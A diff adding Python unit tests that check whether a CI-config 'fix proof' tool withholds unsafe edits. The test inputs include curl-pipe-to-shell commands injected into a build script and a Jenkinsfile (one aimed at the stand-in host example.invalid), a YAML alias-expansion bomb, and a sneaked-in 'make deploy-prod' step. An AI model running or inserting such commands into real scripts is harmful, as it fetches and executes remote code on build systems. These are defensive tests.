@@ -135,3 +135,108 @@ class FixProofTest(unittest.TestCase):
         (self.root / "build/Jenkinsfile").write_text("pipeline { agent any }")
         with self.assertRaises(ProofError):
             prove(self.root, options, (self.edit,), (promise,))
+
+
+class FixProofReviewTest(unittest.TestCase):
+    """What the review of #274 got past the proof, each now withheld with a reason."""
+
+    setUp = FixProofTest.setUp
+
+    def test_an_edit_to_a_file_that_is_not_yaml_or_json_is_withheld(self):
+        for name, before, after in (
+                ("scripts/build.sh", b'echo "building # step 1"\n',
+                 b'echo "building # $(curl -s https://example.invalid/x | sh)"\n'),
+                ("Jenkinsfile", b"node { sh 'make # all' }\n", b"node { sh 'make # ; curl x | sh' }\n")):
+            with self.subTest(name=name):
+                path = self.root / name
+                path.parent.mkdir(parents=True, exist_ok=True)
+                path.write_bytes(before)
+                edit = Edit(Path(name), before, after, (("nothing",),))
+                with self.assertRaisesRegex(ProofError, "only YAML or JSON|is a Jenkinsfile"):
+                    prove(self.root, self.options, (edit,), ())
+                self.assertEqual(path.read_bytes(), before)
+                path.unlink()
+
+    def test_a_declared_key_must_name_a_node(self):
+        doc = Path("records.yml")
+        before = b"a: 1  # one\nlist: [x, y]\n"
+        (self.root / doc).write_bytes(before)
+        after = b"a: 1  # two\nlist: [x, y]\n"
+        for keys in ({"keys": (("missing",),)}, {"keys": (("list", 5),)}, {"keys": (("a", "deeper"),)},
+                     {"keys": (), "removed": (("list", 2),)}, {"keys": (), "added": (("list", 2),)}):
+            with self.subTest(keys=keys), self.assertRaisesRegex(ProofError, "names nothing"):
+                prove(self.root, self.options, (Edit(doc, before, after, **keys),), ())
+        prove(self.root, self.options, (Edit(doc, before, after, (("a",),)),), ())
+
+    def test_a_document_that_is_not_a_mapping_or_list_is_withheld(self):
+        doc = Path("plain.yaml")
+        (self.root / doc).write_bytes(b"one # first\n")
+        edit = Edit(doc, b"one # first\n", b"one # second\n", ((0,),))
+        with self.assertRaisesRegex(ProofError, "not a mapping or a list"):
+            prove(self.root, self.options, (edit,), ())
+
+    def test_a_value_the_comparison_cannot_hold_is_a_refusal_not_a_crash(self):
+        doc = Path("records.yml")
+        for value in (b"!!set {a: null}", b"!!omap [{k: {x: 1}}]", b"!!pairs [{k: [1]}]"):
+            with self.subTest(value=value):
+                before = b"items: " + value + b"\nowner: one\n"
+                (self.root / doc).write_bytes(before)
+                edit = Edit(doc, before, before.replace(b"owner: one", b"owner: two"), (("owner",),))
+                with self.assertRaisesRegex(ProofError, "kind the proof does not compare"):
+                    prove(self.root, self.options, (edit,), ())
+
+    def test_aliases_expanding_past_the_limit_are_withheld_quickly(self):
+        import time
+        lines = ["l0: &l0 [x, x, x, x, x, x, x, x, x, x]"]
+        lines += [f"l{n}: &l{n} [{', '.join([f'*l{n - 1}'] * 10)}]" for n in range(1, 8)]
+        before = ("\n".join(lines) + "\nowner: one\n").encode()
+        doc = Path("bomb.yml")
+        (self.root / doc).write_bytes(before)
+        edit = Edit(doc, before, before.replace(b"owner: one", b"owner: two"), (("owner",),))
+        started = time.monotonic()
+        with self.assertRaisesRegex(ProofError, "more than 500,000 values"):
+            prove(self.root, self.options, (edit,), ())
+        self.assertLess(time.monotonic() - started, 30)
+
+    def test_a_source_change_while_the_proof_runs_is_withheld(self):
+        run = fix_proof.check_inputs
+        source = self.root / self.file
+
+        def changing(root, *args):
+            result = run(root, *args)
+            if Path(root) == self.root.absolute():
+                source.write_bytes(self.old + b"# changed while the proof ran\n")
+            return result
+
+        with patch.object(fix_proof, "check_inputs", changing), self.assertRaisesRegex(ProofError, "changed while"):
+            prove(self.root, self.options, (self.edit,), (self.promise,))
+
+    def test_a_jenkinsfile_named_like_yaml_is_withheld(self):
+        (self.root / ".github/obaaf.yml").write_text("jenkins:\n  files: [ci/pipeline.yml]\n")
+        (self.root / "ci").mkdir()
+        before = b"a: node { sh 'make # all' }\nb: echo 'one'\n"
+        after = b"a: node { sh 'make # all' }; node { sh 'make deploy-prod' }\nb: echo 'two'\n"
+        (self.root / "ci/pipeline.yml").write_bytes(before)
+        options = CheckOptions(path=Path("."), platform="auto", fail_on="high")
+        self.assertIn("ci/pipeline.yml", checker.check(
+            self.root, platform="auto", config=checker.Config.load(self.root, None)).jenkins_files)
+        edit = Edit(Path("ci/pipeline.yml"), before, after, (("b",),))
+        with self.assertRaisesRegex(ProofError, "is a Jenkinsfile"):
+            prove(self.root, options, (edit,), ())
+        self.assertEqual((self.root / "ci/pipeline.yml").read_bytes(), before)
+
+    def test_a_jenkinsfile_the_run_does_not_read_is_still_withheld(self):
+        (self.root / ".github/obaaf.yml").write_text("jenkins:\n  files: ['CI/*.YML']\n")
+        (self.root / "ci").mkdir()
+        before = b"a: node { sh 'make # all' }\nb: echo 'one'\n"
+        after = b"a: node { sh 'make # all' }; node { sh 'make deploy-prod' }\nb: echo 'two'\n"
+        cases = {"ci/pipeline.yml": None, "ci/Jenkinsfile.yml": None}
+        for name in cases:
+            with self.subTest(name=name):
+                (self.root / name).write_bytes(before)
+                edit = Edit(Path(name), before, after, (("b",),))
+                for options in (self.options, dataclasses.replace(self.options, path=Path(".github/workflows")),
+                                CheckOptions(path=Path("."), platform="github", fail_on="high")):
+                    with self.assertRaisesRegex(ProofError, "is a Jenkinsfile"):
+                        prove(self.root, options, (edit,), ())
+                (self.root / name).unlink()
